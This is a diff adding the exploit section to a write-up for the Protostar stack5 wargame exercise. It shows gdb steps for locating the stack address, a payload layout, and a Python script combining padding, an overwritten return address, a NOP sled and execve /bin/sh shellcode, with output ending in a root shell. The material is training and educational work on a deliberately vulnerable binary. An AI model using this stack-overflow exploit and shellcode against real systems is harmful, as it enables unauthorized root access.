@@ -47,7 +47,70 @@ still execute our shellcode.
 
 ## Exploit
 
+First, let's **reuse** the **padding** from [stack4](https://github.com/Naksh-Rathore/protostar-solutions/tree/main/stack4/) so we do not have to check what the padding is *again*.
 
+We first need the **return address's** memory address to use as a estimate of the NOP sled address.
+
+```bash
+(gdb) break *main+22
+(gdb) r
+QQQQWWWWEEEERRRRTTTTYYYYUUUUIIIIOOOOPPPPAAAASSSSDDDDFFFFGGGGHHHHJJJJKKKKLLLLZZZZXXXXCCCCVVVVBBBBNNNNMMMM
+
+SIGSEV - Segmentation Fault
+```
+
+Now, since **the next thing on the stack is the memory address, let's get ESP**, since that will point to the return address.
+
+```bash
+(gdb) p $esp
+$1 = (void *) 0xbffff7d0
+```
+
+Now that we know **the memory address** of the return address, we can make the return address point to **it's memory address + ~30 bytes** to reach the middle of the NOP sled.
+
+But now we need **shellcode**. Let's use the **32 bit execve** `/bin/sh` **shellcode** from **ShellStorm**. I have linked it in the resources section. 
+
+Here is our **payload layout**:
+
+```
+[ 72 bytes of padding ]
+[ 4 bytes to overwrite EBP ]
+[ 4 bytes to overwrite return address ]
+[ NOP sled containing 100 NOPs ]
+[ Shellcode ]
+```
+
+Ok, so let's build the exploit script:
+
+```python
+import struct
+
+padding = "A" * 72
+ebp = "LLLL"
+ret_addr = struct.pack("I", 0xbffff7d0 + 30)
+shellcode = (
+        "\x31\xc0\x50\x68\x2f\x2f\x73"
+        "\x68\x68\x2f\x62\x69\x6e\x89"
+        "\xe3\x89\xc1\x89\xc2\xb0\x0b"
+        "\xcd\x80\x31\xc0\x40\xcd\x80"
+)
+nop_sled = "\x90" * 100
+
+print(padding + ebp + ret_addr + nop_sled + shellcode)
+```
+
+To **properly run**, we need to redirect the stdin to stdout with the `cat` command.
+
+Result:
+
+```bash
+$ (python /tmp/exploit.py; cat) | /opt/protostar/bin/stack5
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALLLL????????????????????????????????????????????????????????????????????????????????????????????????????????1?Ph//shh/bin????°
+                                      ̀1?@̀
+
+whoami
+root
+```
 
 ## Resources
 
@@ -55,3 +118,4 @@ still execute our shellcode.
 * [/bin/sh ShellCode from ShellStorm](https://shell-storm.org/shellcode/files/shellcode-811.html)
 * [LiveOverflow's Solution on YouTube](https://www.youtube.com/watch?v=HSlhY4Uy8SA)
 * [Wikipedia Article on the NX Bit](https://en.wikipedia.org/wiki/NX_bit)
+
